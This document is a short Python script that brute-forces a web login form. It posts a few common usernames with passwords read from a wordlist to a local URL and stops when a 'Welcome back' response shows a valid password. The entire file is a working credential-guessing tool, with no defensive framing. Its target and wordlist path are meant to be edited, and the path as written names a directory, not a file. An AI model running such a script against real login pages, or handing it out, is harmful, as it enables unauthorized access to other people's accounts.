import requests
import sys

target = "http://127.0.0.1:8000" 
usernames = ["admin", "user", "test"]
passwords_file = "/usr/share/wordlist/"  # modify this to meet your location passowrd;s file
needle = "Welcome back"

for username in usernames:
    with open(passwords_file, "r") as password_list: 
        for password in password_list:
            password = password.strip("\n")  
            sys.stdout.write("[X] Attempting password -> {}:{}\r".format(username, password))
            sys.stdout.flush()
            try:
                r = requests.post(target, data={"username": username, "password": password})
                if needle.encode() in r.content:
                    sys.stdout.write("\n")
                    sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!".format(password, username))
                    sys.exit()
            except requests.exceptions.RequestException as e:
                sys.stdout.write("\n")
                sys.stdout.write("\t[!] Error occurred: {}".format(str(e)))
                sys.exit()

    # If password not found 
    sys.stdout.flush()
    sys.stdout.write("\n")
    sys.stdout.write("\tNo valid password found for '{}'! ".format(username))
    sys.stdout.write("\n")